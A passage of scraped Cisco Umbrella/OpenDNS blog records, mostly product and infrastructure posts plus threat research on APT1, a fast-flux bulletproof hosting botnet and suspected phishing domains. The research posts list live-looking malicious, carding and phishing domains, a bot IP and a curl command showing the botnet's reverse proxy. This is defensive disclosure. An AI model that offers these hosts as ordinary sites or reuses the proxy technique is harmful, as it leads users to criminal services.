breach occurs. FireEye reports that it can take businesses an average of 205 days to find a breach, which is why historical data is crucial to investigations. During a post-breach investigation, incident response teams need to retroactively analyze Internet activity to discover all compromised devices – on and off the network. With Log Management, OpenDNS customers get the visibility needed to collect, analyze, and trace breaches to their origin. To trial Log Management with Amazon S3, contact your OpenDNS sales rep or email sales@opendns.com . Existing Umbrella Insights and Umbrella Platform customers can access Log Management with Amazon S3 via the dashboard .", "date": "2015-03-11"},
{"website": "Cisco-Umbrella", "title": "Meet Umbrella: Mobile, Roaming and Everywhere Security by OpenDNS", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/meet-umbrella-mobile-roaming-and-everywhere-security-by-opendns", "abstract": "After a lot of hard work and testing, Umbrella is finally here . Umbrella takes the existing OpenDNS business security offering and extends it dramatically to support roaming Macs, PCs and iOS devices, all managed under one Web-based dashboard. It’s the only solution available today that protects nomadic workers who use iPhones, iPads, and Windows and Mac laptops, while also providing comprehensive network security for headquarters, distributed offices, retail locations and Wi-Fi hotspots. This is game-changing for IT. For the last seven years we’ve watched as IT and network security administrators who have built up walls around their enterprise have lost visibility as their users and the traffic increasingly started moving outside the castle onto mobile devices and accessing cloud services. To put it another way, when your users work from home, starbucks or on the road, and they are using Google Apps, Dropbox, Box or Salesforce, as an IT person, you’ve lost all visibility. We’re going to help you regain it, and then we’re going to help you manage the policy in a way that ensures the right security policy on the right device for the right user at the right time. And for the users, we’re going to deliver this in a way that puts the end-user experience at the forefront, with a focus on performance, efficacy and transparency. We have also focused on an overall architecture that is designed to be easy to deploy, simple to manage and highly effective at blocking security threats. I’m really proud of what we’ve built, and excited to offer Umbrella to you and your organization. OpenDNS has always been a company focused on innovation, and since that focus has given birth to many solutions that make the Internet better, it should be no surprise that we’ve built Umbrella to be unlike anything else available today. But there’s something special behind the unmatched security technology we’ve built. It’s that these security breakthroughs reflect the way we think about not just technology, but the people who use it, too. But I’ve been talking a lot lately about why we built Umbrella to secure today’s nomadic workforce, and now that we’ve launched it’s time you heard from some of our early adopters. Here are some thoughts from our customers: “Umbrella enables us to effectively extend our secure computing environment out into the field, without impacting performance.” — Gabe DiSarro, IT Director for Coldwell Banker Prime Properties “Anyone who cares about network security, especially roaming users, will be very Interested in Umbrella. It’s a fantastic service.” – Ken Morse, CEO of Ilium Software “Umbrella’s mobility solutions allow us to extend the solid security we use on our corporate network to wherever our employees choose to work, effectively protecting them 24/7.” — Randy Raw, Network Security Director at Veterans United Home Loans Umbrella will be focused on serving businesses first. But, we know many long-time friends of OpenDNS are highly technical and might want to take Umbrella for a spin. So, for the next few days or so, I’ve decided to let anyone purchase a single-user license of Umbrella Mobility for just $20 a year. Try it out and let me know what you think. Think of it as a VPN to the cloud, with the ability to add security policies that you define. And I owe you a word about VPNs — We know users hate VPNs — they increase latency and they decrease thruput. We want to turn that on it’s head. We have deployed our cloud security gateways all over the world, and we have more datacenters coming online over the coming months. We’re committed to creating an Internet security network that lives up to our vision. If you want to learn more, you should check out Umbrella and I also hope you’ll join me on Nov. 28th for a webcast on how we’re redefining security for nomadic workers. I can’t wait to hear your thoughts on what we’ve created. It’s just the beginning.", "date": "2012-11-12"},
{"website": "Cisco-Umbrella", "title": "How the infrastructure behind the OpenDNS global network powers Umbrella reporting", "author": ["Adam Phelps"], "link": "https://umbrella.cisco.com/blog/the-opendns-log-analysis-infrasctructure", "abstract": "The Umbrella Security Labs research team has been sharing frequently about how they’re leveraging Big Data to predict unknown threats. And, the OpenDNS and Umbrella product teams have been working to improve the quality and speed of reports in our user Dashboards. The foundation of each of those discussions is how our infrastructure team handles the data itself. This post is an exploration of how OpenDNS handles the massive amounts of data we process daily, without downtime or performance impact, and what it means for the reporting in the Umbrella Dashboard. On an average weekday the DNS resolvers we run at OpenDNS process more than 50 billion queries originating from over 50 million individual IP addresses. These queries are directed at our anycast IPs (208.67.220.220 and 208.67.222.222), which get routed to one of our 20 data centers, and from there to one of our 80 individual resolver hosts. All combined, this results in a huge amount of data. That data must somehow be processed and aggregated to produce the reports available on our users’ Dashboards, and sampled by Umbrella Security Labs who analyze the data to detect and predict security threats. Each query that we log on our resolvers includes the domain being queried, the query’s originating IP, appropriate customer IDs associated with it, and how the query was handled (i.e. whether it was handled normally or blocked due to malware or phishing).  These log entries average around 115 bytes each. Our system produces between 50MB/s and 90MB/s, for a total of over 5TB of raw data produced every day. When I started working at OpenDNS in July of 2010 we were only receiving around half the queries we do now, but the analysis system in use then had been built years earlier. It was barely keeping up. It clearly wasn’t going to scale much further. Like many other companies that have delved into “Big Data” analysis, we built a Hadoop-based infrastructure to replace the previous installation, and it went live in early 2011. Our production Hadoop cluster is composed of roughly 30 (and rapidly growing!) heavy-duty Ubuntu servers. Of these, one is the active Namenode , the cluster’s coordinator and Hadoop’s only single point of failure. To alleviate this risk, we synchronously replicate the Hadoop metadata on this machine to a spare Namenode via DRDB . That allows us to rapidly failover to the spare machine if necessary, and provide a means to update the Namenode without significant downtime. The remaining worker nodes are basically interchangeable and new ones can easily be added as demand increases. On our resolvers the query logging is configured to roll over every 4MB, which results in a new log file every few seconds on each resolver. Sitting between our Hadoop cluster and the resolvers is a set of “loader” machines which pull in these completed log files, combine them into larger chunks, compress them using LZO compression, and finally push them to the Hadoop Distributed File System ( HDFS ).  HDFS replicates data across multiple nodes for redundancy (in our case there are three copies of all data in HDFS), and as the compressed resolver logs for a day currently average 1.1TB, this allows our system’s ~300TB of storage to hold 3 months of raw data. Once all the logs for a given hour have been received, our system launches a variety of Map/Reduce jobs to crunch that data and generate aggregate data for our customer-facing reports. The output of these jobs are loaded into HBASE (a distributed No-SQL database built on top of HDFS) for future access. When a customer visits the reporting page of the OpenDNS Dashboard, the Dashboard sends a query to one of several Appservers which query HBASE for the time frame requested, sum up the data, and return it to the Dashboard for presentation. In order to provide cluster-level failure handling, and be able to upgrade the production cluster while continuing to return reports to the Dashboard, we have an additional cluster which does nothing but provide a live backup of our HBASE data. If the production cluster has failures, or needs to be taken offline, our Appservers can quickly switch to querying the backup HBASE. As an additional level of paranoia, we also take a nightly snapshot of this backup HBASE which we copy to a machine outside of the Hadoop cluster. And that’s the mile-high overview of the infrastructure we use to analyze the massive amount of data our system produces. Our infrastructure is also rapidly evolving as we expand our security research team , develop new reports, and work towards providing real-time analysis and reporting capabilities. If you enjoyed reading about how the OpenDNS Global Network’s infrastructure powers Umbrella, I encourage you to read more in our recent whitepaper . The paper takes a look at how Umbrella Security Labs is harnessing the massive data sets mentioned above to predict future threat origins.", "date": "2013-03-19"},
{"website": "Cisco-Umbrella", "title": "A love letter to early adopters", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/a-love-letter-to-early-adopters", "abstract": "Editor’s note: Serra Boten is a Technical Support Engineer for OpenDNS. A recent transplant from our Vancouver office to our San Francisco headquarters, Serra spends her days providing world-class customer support to Umbrella customers. Dear early adopters, I spend my days helping people navigate the murky waters of the technological forefront. My experiences over the past several years have taught me that if you’re an early adopter, challenges are almost inevitable. You might get the fastest new graphics processor before all of your friends, but there’s a good chance your new shiny toy might accidentally eat your address book or refuse to run that multiplayer Skifree emulator you downloaded back in 1997. Things will break, capacities will be blown, bugs will surface, and sadness will occur. But if you’re lucky, the fruits of your frustration will eventually flourish into something amazing that your luddite friends like me will longingly covet while they spin the wheels on their rotary dial phones. In a world where the Next! Big! Thing! happens on a rapid, 3-month release cycle, I sometimes feel like a luddite. When my iPhone 3GS met an untimely (and wet) end a couple months ago, I begrudgingly upgraded to an iPhone 4, even though I could have gotten the new hotness that is an iPhone 5 for a just small amount more. It wasn’t that frugality got the best of me. I’m just not an early adopter. But you, early adopters, are an essential part of what makes the technological world go ’round. You’re willing to hack, stumble and fight through early release cycles for a chance at eventual triumph. Without you, it would take companies like ours so much longer to work through issues. Without your feedback, the designers, engineers and product managers behind the products you love wouldn’t be able to effectively iterate, adapt, improve, overcome – and most importantly – focus. Without early adopters and beta testers, Umbrella customers might still be wandering around the first version of the Umbrella Dashboard. When we launched in November 2012, there were bugs. There were features missing. There were parts of the user experience that were confusing. But thanks to early adopters, we’ve been able to find and fix a lot of bugs in a very short period of time. You told us what you liked, what you hated and what you found confusing. You reminded us of features we forgot, and have been ever-so-patient while we’ve worked hard to improve every aspect of the experience. (Case in point: we just rolled out a new policy wizard and a the ability to filter noisy reporting data is coming very soon.) Our first wave of Umbrella Mobility customers have a special place in my heart. I’ve spent the majority of my waking (and sometimes dreaming) hours since Umbrella’s launch ensuring your roaming laptops are not only up and running, but also encrypted, protected and – most importantly – as reliable as our core DNS infrastructure. Believe it or not, it’s no simple task to design a lightweight security agent that can be flawlessly installed on any laptop, taken off a secure corporate network, and randomly plunked into a network run by cupid-only-knows who, without breaking anything. But that’s what we’re doing well today, thanks in large part to the powerful feedback we received from early adopters. And we’re going to get even better. Your patience through the hiccups — and let’s be honest, some of the hiccups in the beta may have felt like pants-on-fire, head-smashed-on-the-keyboard moments of omg-why-didn’t-we-realize-that — means more to us than you might ever know. And this isn’t lip service. We’re a small-but-growing team with huge ambition and long to-do lists. We’re moving fast, trying new things, and thriving on the goal of securing the new everywhere-enterprise reality. But one thing that won’t ever change is how much we love and appreciate our customers. Happy Valentine’s Day, early adopters, and thanks for all you do! Sincerely yours, Serra Boten Technical Support Engineer, OpenDNS", "date": "2013-02-14"},
{"website": "Cisco-Umbrella", "title": "An intimate look at APT1, China's Cyber-Espionage Threat", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/a-deeper-dive-into-mandiant-apt1-research", "abstract": "With good reason, the Mandiant report on Advanced Persistent Threat 1 (APT1) and reported operator Chinese PLA Unit 61398 (nicknamed Comment Crew) have been dominating recent news cycles. A recent New York Times article reported that, “While Comment Crew has drained terabytes of data from companies like Coca-Cola, increasingly its focus is on companies involved in the critical infrastructure of the United States — its electrical power grid, gas lines and waterworks. According to the security researchers, one target was a company with remote access to more than 60 percent of oil and gas pipelines in North America. The unit was also among those that attacked the computer security firm RSA, whose computer codes protect confidential corporate and government databases.” Much has been disclosed about the recent attacks, but our team wanted to investigate the traces of APT1 available from our massive data sets in order to get a better idea of how close this threat is to our customers. We also wanted to generalize the observed behavior of these traces into good heuristics for future discoveries and to spot anomalies or potentially-hidden links that could shed light on APT1’s infection vectors. We uncovered some fascinating results through our research. Of the 2,046 APT1 command and control (C&C) domains we looked at, 98% are stealth operators, showing only 0-100 daily requests. However, a few domains receive tens of thousands of requests in a single day. The traffic volume is consistent across all hours, indicating script behavior. [ traffic pattern shown in sgraph] Among all the IP addresses contacting these APT1 C2 domains, we spotted only two Chinese IP addresses, which is especially interesting because the attack has been widely-claimed to be China state-sponsored. However, considering the strong Internet censorship in China, it isn’t unlikely that a particular organization or ethnic group could be hacked by their own government. Like Mandiant, our research also indicates that targets exist across multiple countries and industries.  Top targets include telecommunication carriers, petroleum companies and large-scale business infrastructure providers. [one victim IP is mapped to Korea Telecom] [a screen shot of the home page of a large European dedicated server hosting provider] Although we know that spear phishing was the primary infection vector, it is not yet clear or disclosed how many of the other infections transpired. The C2 names were clearly carefully-composed to easily confuse people with trusted news or service sites, such as “nytimesnews.net”, “firefoxupdata.com”. As we mentioned earlier, we used the Umbrella Security Graph to apply co-occurring pattern discovery. Co-occurrence measures the frequency of each pair of domains being requested by the same person across the population of all clients in a small time window. Most importantly, co-occurrence pattern discovery allows us to surface undiscovered connections between threats. The list of domains below have exclusively co-occurred with one of the APT1 C&C domains within a small, pre-set time window. Nine of them are known malicious sites, and include drive-by downloads, spam, Fake AV and phishing threats. Looking closely at these threats, we recognize ff-demo.blogdns.org, a domain associated with the FinFisher/FinSpy spying tool that is reported to be used by certain governments to spy on domestic activists. We also recognize omughaltef.sendsmtp.com, a domain tied to the UrlZone banking trojan. kazinczy-gyor.hu smotri.com bio-vozrast.ru bulletincash.asia coi.easyglobalflirt.info ff-demo.blogdns.org ff-traditions.com greatgolfaccessories.com governingjerk.org good.timepiece-locator.com onzxpldnealjzddeofbmbq.ru omughaltef.sendsmtp.com As of the time of our reporting, most of the APT1 domains have been suspended or sink-holed. However, there are still more than a hundred Active IPs that a larger sample of APT1 domains resolve to (shown below). [load-javascript slug=”apt1-domains-ips-map”]", "date": "2013-02-27"},
{"website": "Cisco-Umbrella", "title": "Cloud-Delivered Security: Think Outside the Box", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/cloud-delivered-security-think-outside-the-box", "abstract": "“The cloud” as a phrase has been defined to death, and yet for many people it remains as mysterious as its natural namesake. In Gizmodo, Adam Clark Estes writes that “[the] Cloud is a buzzword that vaguely suggests the promise and convenience of being able to access files from anywhere.” Replace “files” with “threat protection,” and what remains is a lukewarm definition of cloud-delivered security . However, there’s one enormous difference: cloud-delivered security has evolved in the past few years beyond a mere nice-to-have feature—it’s a burgeoning security model that’s disrupting the industry and making protection more accessible than ever. However, this again brings us to defining the cloud though through a security lens. What does “cloud-delivered security” actually mean? One could say “cloud” solutions mean there’s no box on premises, and leave it at that. The box in this case would be a security appliance that sits in a company’s server room. But this definition would be limiting and not inclusive of the many shades of gray that exist in cloud security. As vendors jockey to separate themselves from competitors, the definition can become muddled beyond comprehension. In the interest of brevity, security solutions can be separated into three categories: on-premises, hybrid cloud, and cloud. Most security professionals are familiar with on-premises solutions : there’s an appliance (again, an actual box) that sits on the network, protecting employees in a specific location. Updates, upgrades, and all other associated work are done in-house. In a hybrid cloud solution , part of that workload is given to the vendor—although there may be new hardware or software to install on-premises. Pure cloud solutions require no new hardware. Cloud solutions also offer a host of advantages that extend, and work in tandem with, on-premise and hybrid solutions. The most important of which is transforming the traditional security model into something business applications have been for years: on demand. The SaaS model has been wildly successful, as evidenced in companies such as Salesforce and Box. With Security as a Service, companies are able to take advantage of third-party infrastructure and intelligence to protect their networks without excessive administrative overhead. In a VentureBeat article, Meghan Kelly writes , “Unlike older security tools, like anti-virus software that needs to be installed on every single computer on your network, it’s almost plug and play—you click a button (and likely put in some credit card information) and suddenly you’ve got major security resources at your fingertips.” For SMB administrators and busy enterprise SOCs alike, having an easily managed and consistent security service is essential. With a third-party vendor handling updates and constantly protecting against new threats globally, in real-time, security and IT professionals can spend less time patching and inevitably cleaning endpoint infections. Another pressing issue for administrators is scaling security. With a cloud service, this issue disappears. The vendor shoulders the responsibility of building and maintaining the infrastructure. Even the fastest-growing startup or Fortune 500 company can deploy a solution within hours, compared to days. Demonstrating the ease of scale, Google–the quintessential tech industry mammoth–is putting cloud security into place. Google, it seems, understands the importance of not scaling past an appliance’s capacity. Finally, cloud-delivered security solutions offer the ability to protect endpoints anywhere in the world—an especially useful feature now that more people than ever are working remotely. According to Global Workplace Analytics in 2012, “2.6% of the U.S. employee workforce (3.3 million people, not including the self-employed or unpaid volunteers) considered home their primary place of work.” That number increases each year, and doesn’t factor in employees who travel for work, or mobile devices that access the network and company data. The ability to extend enterprise-grade protection to those workers while maintaining performance standards can only be done through cloud-delivered security, which makes it a valuable part of any security posture. As the technology behind cloud-delivered security advances, these benefits may be the first of many more to come. If the explosive growth of security as a service companies are any indication of trust, companies are more than willing to place their bets on cloud services–augmenting or even abandoning their hybrid and on-premises solutions. Discussing Google’s adoption of cloud security, Jon Oltsik, senior principal analyst at IT research firm Enterprise Strategy Group, said, “A lot of companies can learn from Google’s aggressiveness…There’s not a company anywhere that won’t have to develop something like this.”", "date": "2015-05-12"},
{"website": "Cisco-Umbrella", "title": "AT&T’s DNS customers suffered service disruptions. OpenDNS users stay connected.", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/att-dns-outage-use-opendns-instead", "abstract": "AT&T suffered a Distributed Denial of Service (DDoS) attack on its DNS servers Wednesday, causing intermittent Internet service disruptions for its paying business customers. However, the thousands of businesses using OpenDNS’s free Premium DNS service remained online, just as they always do thanks to our 100 percent perfect uptime record. Fifty million people choose OpenDNS today and the catalyst for many who made the switch has been a DNS outage by a major ISP. From the epic Time Warner blackout that affected much of Los Angeles to the Italian ISP’s DNS outage that took many of the country’s citizens offline, and even most recently when Canadian ISP Eastlink’s DNS servers went down. But today we’d like to make a simple recommendation: Don’t wait for an outage to make the switch. At home and at your business, you have a choice in your DNS service. With 12 global data centers located at the Internet’s most high-traffic intersections, 100 percent uptime since our launch in 2006, and built-in protection against phishing and wide-scale Internet threats, we recommend you choose OpenDNS.", "date": "2012-08-17"},
{"website": "Cisco-Umbrella", "title": "OpenDNS and the SOPA blackout: The censorship you can expect", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-and-the-sopa-blackout-the-censorship-you-can-expect", "abstract": "In a show of solidarity with the Internet community, a group of popular websites will “black out” tomorrow to demonstrate what the world might look like if SOPA and PIPA pass. Participating websites include Wikipedia.org, Reddit.com, Mozilla.org and BoingBoing.com. As the world’s largest DNS provider, more than 30 million people rely on OpenDNS to connect to the Internet. Without functioning DNS, you’d need to know the IP address for every website you visit. And lots of parents, schools and businesses rely on our website to manage their DNS and Web security settings. All that said, taking our service or website down for a day is not an effective way for OpenDNS to show our firm opposition to the bills. Since folks on Twitter and elsewhere are asking, we will be showing our support tomorrow, but we will not be taking OpenDNS offline. What is an effective way for us to show our opposition is to censor search results on our Guide. One component of our service, OpenDNS Guide, helps give users a more thoughtful next step when navigating the Internet than the dead end of a 404 error. So when users of our free services attempt to visit a website that’s having technical issues, we show them search results that are based on what they entered in their search bar. For one business day starting at 8 AM Eastern time tomorrow, we will randomly redact the text of search results appearing in OpenDNS Guide pageviews. This is not a decision we take lightly and we’re fully aware it can, and will, create a frustrating experience both for our users, and for owners of websites being censored. But with 30 million+ users we have the equivalent of a megaphone on the Internet. We feel it’s our responsibility to demonstrate the near-random methodology SOPA and PIPA propose to determine those websites contributing to piracy, and also what the Internet would look like if their fate was to be blocked. It seems the efforts of the Internet community are making progress in the fight against these ill-informed bills. The White House issued a response, and now Lamar Smith has followed Patrick Leahy’s example, back-peddling and vowing to remove the DNS-blocking component of SOPA. Keep it up, friends.", "date": "2012-01-17"},
{"website": "Cisco-Umbrella", "title": "HughesNet satellite broadband customers cannot use OpenDNS at this time", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/hughesnet-satellite-broadband-customers-cannot-use-opendns-at-this-time", "abstract": "While I’ve publicly speculated before, I now have official confirmation from Hughes that HughesNet customers cannot use OpenDNS — or any other alternate DNS service — at this time. In HughesNet’s terms: Every remote [computer] uses the HughesNet turbo page servers, which only use HughesNet DNS. The “turbo page servers” are the proxy which HughesNet uses to limit the latency imposed by satellite connections. There is one workaround, but it doesn’t sound like an improvement, and no one (not Hughes, not me) recommends it. Still…for curious technical folks, you may choose to not use the HughesNet turbo page servers. If you do that, then you may use an alternate DNS provider, including OpenDNS. However, given the latency of satellite broadband, I can’t imagine that faster DNS will counteract slower download speeds, as much as I might hope it would. I don’t have official answers/confirmation from other satellite ISPs, but I expect the story is similar. 🙁", "date": "2006-10-18"},
{"website": "Cisco-Umbrella", "title": "Black Hat 2016 preview: Fast Flux with SSL, a unique and popular Bulletproof Hosting option for cyber criminals", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/black-hat-2016-fast-flux-ssl-unique-popular-bulletproof-hosting-option-cyber-criminals", "abstract": "Fast Flux botnets 2013-2016 In the current cybercrime ecosystem, fast flux proxy networks are an efficient form of bulletproof hosting. They represent a hosting-as-a-service or reverse proxy platform for various malware and ransomware C2 domains, as well as phishing and carding sites. We covered the Kelihos fast flux network back in 2013 in a few blogs [1] as well as at BSides New Orleans [2], APWG eCrime [2] , and Botconf [3] [4] . At Black Hat 2014 [5] [6] [7] and Defcon 22 [8] [9] , we disclosed research about another fast flux hosting infrastructure we called the “Zbot fast flux proxy network” which we have been tracking since 2013. At Botconf 2013, this proxy network was briefly mentioned and dubbed “fluxxy” by Nick Summerlin and Brad Porter. This hosting network is a botnet that consisted of a couple tens of thousands of infected hosts located mainly in Russia and Ukraine. It was easy to recognize because the domains it was hosting had a TTL value of 150 seconds. The name servers of these domains were also fluxing to IPs from the botnet which characterizes this network as double flux. At the time, the botnet was used by criminal customers to serve Zeus, Kins, ICE IX and Citadel config, binary and drop zone urls in addition to Asprox and DDoS bot C2s, phishing sites and Pony panels. We subsequently presented more results about this botnet at Botconf 2014 [10] . In Mid 2015, the operators behind the “Zbot” proxy network updated their setup in such a way that the served fast flux domains were now resolving to bot IPs with a random TTL in the range between 129 to 150 seconds and the network remained double flux. The botnet also started supporting SSL communication. This infrastructure evolved most likely to evade detection or for other operational reasons. We discussed the new TTL update at Hack.lu 2015 [11] . At the time, the network has added more malware variants served on behalf of its clientele such as Zemot/Rerdom, Necurs, Tinba, and Rovnix. Even the ephemeral new GameOver Zeus used it to host some of its DGAs in July 2014 [12] before it switched to dedicated hosting then withered away. More recently, a few blogs in 2016 touched upon this botnet such as [13] . What’s new at Black Hat 2016? This year at Black Hat 2016 , we will be unveiling novel results about this bulletproof fast flux hosting infrastructure. We also collaborated with Intel471 to shed light on the underground service and actors behind this botnet. Content Delivery Network functionality At the moment, this network is leveraging up to 56,000 live bots that consist in compromised home and SOHO routers concentrated in Russia and Ukraine. The network performs reverse proxy functions similar to that of a common CDN, but with an emphasis on hiding the upstream malware content providers. For example, curl –header ‘Host: mrbin.cc’ hxxp://109.86.110.190 will return the main page of hxxp://mrbin.cc/ where 109.86.110.190 is a live bot IP. hxxp://mrbin.cc/ is a known carding site that is currently served by the fast flux infrastructure. The content of hxxp://mrbin.cc/ can be delivered by any bot IP supporting this feature. A subset of the entire botnet support this reverse proxy feature. In the past months, this proxy network delivered Teslacrypt payments sites, RockLoader, Quakbot and Ramdo C2 domains, as well as phishing, and carding sites. Currently, the longest living active domains served by the botnet are carding sites such as: csh0p.cc mcduck.tv mcduck.ws mcdumpals.at mrbin.cc mrbin.tv popeyeds.cc popeyeds.la royaldumps.cm royaldumps.tw try2swipe.me try2swipe.ws unclesam.tw unclesam.ws www.csh0p.cc A few CIBC bank phishing sites are also live at the time of this writing. SSL support A notable technical aspect of this botnet is its use of SSL certificates for securing traffic. Currently, the botnet supports 5 active SSL certs , one is self-signed and the remaining four are legitimate and valid. Only a subset of the entire botnet (around 2.5% of IPs) supports SSL certs. We point out that the attackers are essentially playing by the rules to obtain these certs. They are not exploiting a flaw in PKI, SSL/TLS, browser security models, or even the certificate authorities. They are obtaining (through a small fee, if any) a certificate to verify to others that they really own their domains. Except, they use their domains to serve for malicious intent. They’ve essentially made that reassuring green lock icon in your browser mean that you have a really secure link to the attacker. We’ll discuss our findings on this aspect involving a well known CA that had signed many of the certificates we observed being used on malicious domains. The Actors The folks at Intel 471 closely monitor the various underground services used by threat actors and groups. One such service is that of bulletproof hosting, which is a key cybercrime enabler. Intel 471 categorizes bulletproof hosting services into tiers depending on the technical and administrative complexity, reputation, and resiliency to takedown of the provider. Working with the researchers at Intel 471 we’ve been able to correlate key characteristics of the technical aspect of the fast flux botnet and domains to actors and groups in the underground that are both using and operating the botnet. It’s believed the group behind this particular fast flux botnet is actually one of a small number of top-tier bulletproof hosting providers found in the underground marketplace. This particular group has been providing bulletproof services to the Russian and English language marketplaces since mid-2011, but their origins may date as far back as early 2000. Since their arrival to the underground marketplace, this particular service provider has built a very good reputation among cyber-criminals. One of the group’s more unique offerings is fast and stable fast flux hosting via bots, or compromised hosts. Even more unique, when compared to other bulletproof hosting providers, is the ability to use SSL in conjunction with the fast flux hosting in order to secure traffic. This functionality was specifically advertised as part of the service offering starting in April 2015. This correlates with technical analysis and research we had done in May 2015 where we had identified a revamping of the botnet and addition of SSL functionality in May 2015. We have refrained from including actor handles and the name of the bulletproof service as Intel 471 has asked that they not be named publicly. Conclusion The malware content served by this botnet proxy network is constantly changing since it is a hosting as a service platform. As new criminal customers rent service from this platform or the needs of existing clients evolve, the botnet will deliver different content based on those needs. In our upcoming Black Hat 2016 talk , we will disclose further details and show that the combination of technical research and actor-centric research through the collaboration with Intel 471 can provide valuable insights that would otherwise be missed. We thank colleagues Thomas Mathew and Chris Dorros and the Intel471 folks for collaborating on this research. References [1] /2013/07/30/tracking-versatile-kelihos-domains/ [2] /2013/09/24/real-time-monitoring-kelihos-fast-flux-botnet-case-study-presented-apwg-ecrime-2013/ [3] /2013/12/18/operation-kelihos-presented-botconf-2013/ [4] http://www.dailymotion.com/video/x1ap0b5_14-hendrik-adrian-and-dhia-mahjoub-the-power-of-a-team-work-management-of-dissecting-a-fast-flux-bot_tech [5] https://www.youtube.com/watch?v=cHuyqnVhT4g [6] https://www.blackhat.com/docs/us-14/materials/us-14-Mahjoub-Catching-Malware-En-Masse-DNS-And-IP-Style.pdf [7] https://www.blackhat.com/docs/us-14/materials/us-14-Mahjoub-Catching-Malware-En-Masse-DNS-And-IP-Style-WP.pdf [8] https://www.youtube.com/watch?v=KFx4lhxMi-M [9] https://defcon.org/images/defcon-22/dc-22-presentations/Mahjoub-Toonk-Reuille/DEFCON-22-Mahjoub-Reuille-Toonk-Catching-Malware-En-Masse-DNS-IP-Style-UPDATED.pdf [10] https://www.youtube.com/watch?v=eC2jPNU0NZI [11] http://2015.hack.lu/talks/#a-collective-view-of-current-trends-in-criminal-hosting-infrastructures [12] http://garwarner.blogspot.com/2014/07/new-gameover-zeus-variant-uses-fastflux.html [13] http://krebsonsecurity.com/2016/05/carding-sites-turn-to-the-dark-cloud/", "date": "2016-05-16"},
{"website": "Cisco-Umbrella", "title": "Domain Names: Are you watching closely?", "author": ["Shyam Sundar Ramaswami"], "link": "https://umbrella.cisco.com/blog/domain-names-watching-closely", "abstract": "Let’s say you’re a fan of DC Comics and visit their webpage frequently. If I were to ask you to recall the IP address of dccomics.com in order to visit the website, chances are you wouldn’t know it. The IP would have no meaning to you. Domain names make surfing the Internet easy for us to get where we want to go. In our security research, domain names play a vital role. Often times, just by seeing a domain name one can easily narrow down the domains that may be malicious, parked, or used for phishing. For instance, phishing domain names are made to look closely like banking sites or other popular brands in order to lure the user into entering their private credentials. Ah! A classic Apple phishing page. We see a lot of domains that are “parked” in our daily research. Parked domains are like placeholders waiting to serve content. You will typically see “Coming Soon” when visiting. At Cisco Umbrella, we may make the decision to block certain parked domains if they’re seen to host malicious links or redirects, or appear to be typo-squatting to phish users. Recently we had a set of domain names that at first glance, appeared to be a list of parked domain names. We pivoted through our information on these domains in order to learn more about their infrastructure. GETTING A CLOSER LOOK The amount of queries as seen on our resolvers to one of these domains was fairly low: This pattern would usually lead us to the conclusion that it was in fact only a parked domain name. However, things got a little more interesting when we saw the following subdomains: ebumjae[.]twfzx[.]com cnhkyahootumbler[.]twfzx[.]com www[.]cnhkyahootumbler[.]twfzx[.]com www[.]3uwin[.]com outlook[.]3uwin[.]com fw[.]3uwin[.]com When a domain is parked and not hosting any content, it’s suspicious to see multiple subdomains with any notable query traffic. Some of these subdomains resemble DGAs. WHO? WHAT? WHERE? These domains were all registered to email addresses with usernames consisting of random letters and numbers at the domain qq[.]com. Interestingly, the domains were all registered on the 21st – 26th of a given month. These were registered in September, February and November We know that qq[.]com is a free hosting provider. Someone may have written a mechanism that creates e-mail accounts with random characters, which were used to register the domain names. The email addresses all differed and appeared random. The company’s name was the same for most. VIEWING THE CONTENT The domains all contained content similar to the picture below: A few domains redirected to other websites with unfinished pages. The top banner image and domain name did not appear to have any relationship to the content displayed. It appears to be a template that isn’t interactive and only hosted as a placeholder. Among the list of domains registered to these email addresses, we found domain names that appear to be phishing for Apple credentials. os-ios[.]com management-ios[.]com While the content displayed on these pages does not appear to have any relationship to the domain name and is not currently serving a phishing page, we suspect that the registrant is experimenting with page templates on these domains names and getting ready to launch a phishing campaign. We’re staying vigilant by watching these domains, registrants, and overarching patterns to protect our customers from new badness. We will continue to keep you updated as we find these new threats!", "date": "2017-03-28"},
{"website": "Cisco-Umbrella", "title": "DNS Outage? Simple Setup for OpenDNS", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/dns-outage-simple-setup-for-opendns", "abstract": "DNS outages happen everywhere, from Italy to Illinois. And when they do, we can count on people taking to Twitter via their smart phones, to vent, find out what’s going on, and learn how they can get back online (thanks to us!). We love helping frustrated people set up OpenDNS during these DNS outages. But one thing we discovered is that for the less-than-technical people amongst us, simply saying “use 208.67.222.222 & 208.67.220.220” isn’t enough. People don’t know what those numbers are, or where to look on their computer or router to change them. That’s why we’ve created a new mini-site; you can find it at use.opendns.com or http://208.69.38.205/ . Why are we making it accessible via both an IP and a URL? Because if your DNS is down, we want you to be able to access the instructions via your computer’s browser. Having an IP address means no matter what’s happening with your DNS, you can get to the site. The next time there’s a DNS outage, we’ll head to Twitter as we normally do, to act as a resource and problem solver for those without DNS. And, thanks to this new page, it will be easier than ever to get OpenDNS set up, even for those who’ve never heard the term DNS before. But our hope is that we won’t be the only ones. Our hope is that you’ll bookmark http://208.69.38.205/ and that the next time you hear that there’s a DNS outage, you can be a resource for your friends. Text them, call them, tweet at them — let them know it’s easy to get back online and it’s simple to get safer, faster, smarter and more reliable Internet — all that’s needed is to set up OpenDNS.", "date": "2011-01-06"},
